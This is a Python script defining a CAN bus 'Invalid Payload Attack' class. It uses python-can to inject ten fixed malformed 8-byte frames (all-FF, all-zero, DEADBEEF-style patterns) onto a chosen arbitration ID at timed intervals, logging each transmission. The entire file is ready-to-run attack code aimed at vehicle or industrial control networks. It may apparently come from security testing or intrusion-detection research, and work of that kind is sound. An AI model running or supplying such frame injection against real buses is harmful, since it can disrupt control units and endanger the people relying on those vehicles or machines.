import time
import can


class InvalidPayloadAttack:

    def __init__(
        self,
        can_bus,
        can_id=0x123,
        delay=0.5
    ):

        self.can_bus = can_bus
        self.can_id = can_id
        self.delay = delay

        self.payloads = [

            bytes.fromhex("FFFFFFFFFFFFFFFF"),
            bytes.fromhex("0000000000000000"),
            bytes.fromhex("AAAAAAAAAAAAAAAA"),
            bytes.fromhex("5555555555555555"),
            bytes.fromhex("0123456789ABCDEF"),
            bytes.fromhex("DEADBEEFCAFEBABE"),
            bytes.fromhex("7F7F7F7F7F7F7F7F"),
            bytes.fromhex("8080808080808080"),
            bytes.fromhex("FFFFFFFF00000000"),
            bytes.fromhex("0000FFFFFFFF0000")

        ]


    def start(self):

        print("[+] Invalid Payload Attack Started")
        print(f"[+] Target CAN ID : 0x{self.can_id:03X}")

        message_count = 0

        for payload in self.payloads:

            message = can.Message(
                arbitration_id=self.can_id,
                data=payload,
                is_extended_id=False
            )

            self.can_bus.send(message)

            print(
                f"[TX] ID: 0x{self.can_id:03X} "
                f"DATA: {payload.hex().upper()}"
            )

            message_count += 1

            time.sleep(self.delay)

        print("[+] Invalid Payload Attack Completed")
        print(f"[+] Total Messages Sent: {message_count}")